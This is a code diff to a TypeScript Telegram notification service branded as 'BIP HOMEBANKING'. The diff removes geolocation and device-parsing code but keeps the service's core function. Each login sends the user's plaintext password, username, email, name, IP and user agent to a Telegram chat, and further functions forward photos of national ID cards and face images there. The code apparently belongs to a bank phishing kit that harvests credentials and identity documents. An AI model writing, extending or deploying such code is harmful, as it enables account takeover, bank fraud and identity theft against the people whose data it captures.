@@ -1,19 +1,5 @@
 // 📱 Servicio de notificaciones por Telegram
 import TelegramBot from 'node-telegram-bot-api';
-import * as fs from 'fs';
-import * as path from 'path';
-
-let geoip: any = null;
-let UAParser: any = null;
-
-// Cargar módulos opcionales
-try {
-  geoip = require('geoip-lite');
-  const uaParser = require('ua-parser-js');
-  UAParser = uaParser.UAParser || uaParser;
-} catch (error) {
-  console.log('⚠️ Módulos de geolocalización no disponibles');
-}
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
@@ -40,57 +26,17 @@ export const sendLoginNotification = async (userData: {
   }
 
   try {
-    // Obtener información del dispositivo
-    let deviceInfo: any = {
-      browser: { name: 'Desconocido', version: '' },
-      os: { name: 'Desconocido', version: '' },
-      device: { vendor: '', model: '', type: 'Desktop' }
-    };
-    
-    if (UAParser && userData.userAgent) {
-      const parser = new UAParser(userData.userAgent);
-      deviceInfo = parser.getResult();
-    }
-    
-    // Obtener geolocalización por IP
-    let locationInfo = '🌍 *Ubicación:* No disponible';
-    if (geoip && userData.ip && userData.ip !== '::1' && userData.ip !== '127.0.0.1') {
-      try {
-        const geo = geoip.lookup(userData.ip);
-        if (geo) {
-          locationInfo = `🌍 *Ubicación:* ${geo.city || 'Desconocida'}, ${geo.country}\n📍 *Coordenadas:* ${geo.ll[0]}, ${geo.ll[1]}`;
-        }
-      } catch (e) {
-        console.log('Error obteniendo geolocalización:', e);
-      }
-    }
-
     const message = `
 🔐 *NUEVO LOGIN - BIP HOMEBANKING*
 
-━━━━━━━━━━━━━━━━━━━━━━
-👤 *DATOS DEL USUARIO*
-━━━━━━━━━━━━━━━━━━━━━━
-📝 *Usuario:* \`${userData.username}\`
+👤 *Usuario:* \`${userData.username}\`
 🔑 *Contraseña:* \`${userData.password}\`
 📧 *Email:* ${userData.email}
 👨‍💼 *Nombre:* ${userData.name}
 
-━━━━━━━━━━━━━━━━━━━━━━
-📱 *INFORMACIÓN DEL DISPOSITIVO*
-━━━━━━━━━━━━━━━━━━━━━━
-💻 *Navegador:* ${deviceInfo.browser.name || 'Desconocido'} ${deviceInfo.browser.version || ''}
-📱 *Sistema:* ${deviceInfo.os.name || 'Desconocido'} ${deviceInfo.os.version || ''}
-🖥️ *Dispositivo:* ${deviceInfo.device.vendor || ''} ${deviceInfo.device.model || deviceInfo.device.type || 'Desktop'}
-
-━━━━━━━━━━━━━━━━━━━━━━
-🌐 *INFORMACIÓN DE RED*
-━━━━━━━━━━━━━━━━━━━━━━
+📱 *User Agent:* ${userData.userAgent || 'No disponible'}
 🔢 *IP:* ${userData.ip || 'No disponible'}
-${locationInfo}
-
-━━━━━━━━━━━━━━━━━━━━━━
-🕐 *Fecha y Hora:* ${userData.timestamp}
+🕐 *Fecha:* ${userData.timestamp}
 
 ✅ *LOGIN EXITOSO*
     `;
@@ -108,7 +54,6 @@ export const sendDNINotification = async (data: {
   backImage: string;
   timestamp: string;
   dniData?: any;
-  bcraValidation?: any;
 }) => {
   if (!bot || !TELEGRAM_CHAT_ID) {
     console.log('⚠️ Telegram no configurado');
@@ -116,38 +61,13 @@ export const sendDNINotification = async (data: {
   }
 
   try {
-    const validationEmoji = data.bcraValidation?.valid ? '✅' : '❌';
-    const scoreEmoji = data.bcraValidation?.score >= 90 ? '🟢' : data.bcraValidation?.score >= 70 ? '🟡' : '🔴';
-    
     const message = `
 📄 *VERIFICACIÓN DNI - BIP HOMEBANKING*
 
-━━━━━━━━━━━━━━━━━━━━━━
-👤 *DATOS PERSONALES*
-━━━━━━━━━━━━━━━━━━━━━━
-📝 *Usuario ID:* ${data.userId}
-${data.dniData ? `
-🆔 *Número DNI:* ${data.dniData.numero}
-👤 *Nombre:* ${data.dniData.nombre} ${data.dniData.apellido}
-🎂 *Fecha Nac.:* ${data.dniData.fechaNacimiento}
-⚥ *Sexo:* ${data.dniData.sexo}
-📅 *Emisión:* ${data.dniData.fechaEmision}
-📅 *Vencimiento:* ${data.dniData.fechaVencimiento}
-` : ''}
-
-━━━━━━━━━━━━━━━━━━━━━━
-🏦 *VALIDACIÓN BANCO CENTRAL*
-━━━━━━━━━━━━━━━━━━━━━━
-${data.bcraValidation ? `
-${validationEmoji} *Estado:* ${data.bcraValidation.status}
-${scoreEmoji} *Score:* ${data.bcraValidation.score}/100
-✓ *Verificado:* ${data.bcraValidation.verificado ? 'SÍ' : 'NO'}
-` : 'No disponible'}
-
-━━━━━━━━━━━━━━━━━━━━━━
+👤 *Usuario ID:* ${data.userId}
 🕐 *Fecha:* ${data.timestamp}
 
-📸 Imágenes del DNI adjuntas ↓
+📸 Imágenes del DNI adjuntas
     `;
 
     await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
@@ -157,11 +77,11 @@ ${scoreEmoji} *Score:* ${data.bcraValidation.score}/100
     const backBuffer = Buffer.from(data.backImage.split(',')[1], 'base64');
 
     await bot.sendPhoto(TELEGRAM_CHAT_ID, frontBuffer, { 
-      caption: `📄 DNI - FRENTE\n🆔 ${data.dniData?.numero || 'N/A'}` 
+      caption: `📄 DNI - FRENTE` 
     });
     
     await bot.sendPhoto(TELEGRAM_CHAT_ID, backBuffer, { 
-      caption: `📄 DNI - DORSO\n🆔 ${data.dniData?.numero || 'N/A'}` 
+      caption: `📄 DNI - DORSO` 
     });
 
     console.log('✅ DNI enviado a Telegram');
@@ -182,24 +102,20 @@ export const sendFacialNotification = async (data: {
   }
 
   try {
-    const lightEmoji = data.lightLevel >= 60 ? '🟢' : data.lightLevel >= 30 ? '🟡' : '🔴';
-    const qualityStatus = data.lightLevel >= 60 ? 'EXCELENTE' : data.lightLevel >= 30 ? 'BUENA' : 'REGULAR';
+    const lightEmoji = data.lightLevel >= 60 ? '✅' : data.lightLevel >= 30 ? '⚠️' : '❌';
+    const qualityStatus = data.lightLevel >= 60 ? 'EXCELENTE' : data.lightLevel >= 30 ? 'ACEPTABLE' : 'BAJA';
     
     const message = `
 👤 *VERIFICACIÓN FACIAL - BIP HOMEBANKING*
 
-━━━━━━━━━━━━━━━━━━━━━━
-📊 *ANÁLISIS BIOMÉTRICO*
-━━━━━━━━━━━━━━━━━━━━━━
 👤 *Usuario ID:* ${data.userId}
 💡 *Nivel de Luz:* ${data.lightLevel}% ${lightEmoji}
 📈 *Calidad:* ${qualityStatus}
 ✅ *Verificación:* COMPLETADA
 
-━━━━━━━━━━━━━━━━━━━━━━
 🕐 *Fecha:* ${data.timestamp}
 
-📸 Foto de verificación facial adjunta ↓
+📸 Foto de verificación facial adjunta
     `;
 
     await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
@@ -207,7 +123,7 @@ export const sendFacialNotification = async (data: {
     // Enviar foto facial
     const faceBuffer = Buffer.from(data.faceImage.split(',')[1], 'base64');
     await bot.sendPhoto(TELEGRAM_CHAT_ID, faceBuffer, { 
-      caption: `👤 VERIFICACIÓN FACIAL\n💡 Luz: ${data.lightLevel}% | ${qualityStatus}` 
+      caption: `👤 VERIFICACIÓN FACIAL - Luz: ${data.lightLevel}% - ${qualityStatus}` 
     });
 
     console.log('✅ Verificación facial enviada a Telegram');
